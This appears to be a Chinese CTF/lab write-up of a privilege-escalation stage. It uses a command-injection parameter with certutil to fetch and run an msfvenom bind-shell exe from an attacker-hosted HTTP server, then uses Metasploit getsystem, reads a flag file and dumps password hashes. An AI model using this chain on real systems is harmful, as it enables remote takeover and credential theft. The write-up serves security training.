## 权限提升

尝试过先写一个webshell再用蚁剑直接连接上传，发现不太行，大概率存在杀软

直接本地开个web服务，把msf生成的木马上传上去，利用这里的代码执行直接运行exe上线msf

生成正向连接exe

```bash
msfvenom -p windows/meterpreter/bind_tcp LPORT=4444 -f exe -o bind_shell_x86.exe
```


开启一个python http服务

```bash
python3 -m http.server 80
```

![](/medias/lab-pt2/3.png)


在靶机上命令执行，下载这个exe

```bash
out_trade_no[0]=eq&out_trade_no[1]=certutil -urlcache -split -f  http://172.16.233.2/bind_shell_x86.exe 1.exe&out_trade_no[2]=system
```

运行这个exe

```bash
out_trade_no[0]=eq&out_trade_no[1]=1.exe&out_trade_no[2]=system
```

本地msf监听

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set rhost 192.168.1.11
set lport 4444
run
```

然后meterpreter就上线msf了

![](/medias/lab-pt2/4.png)


getuid，一个低权限的用户。尝试直接getsystem提权

```bash
getuid
getsystem
```

![](/medias/lab-pt2/5.png)

然后可以发现，flag.txt在C:\tmp\flag.txt，读取flag

meterpreter里可以使用cat命令读取靶机文件

```bash
cat C:\tmp\flag.txt
```

或者使用shell命令进入靶机，使用type命令读取


```bash
type C:\tmp\flag.txt
```

![](/medias/lab-pt2/6.png)

获取管理员账户的hash

exit退出靶机shell环境，回到meterpreter，直接hashdump读取哈希

```bash
exit
hashdump
```

![](/medias/lab-pt2/7.png)


获取的哈希格式是`用户名:RID:LM哈希:NT哈希:::`

```plaintext
meterpreter > hashdump
```
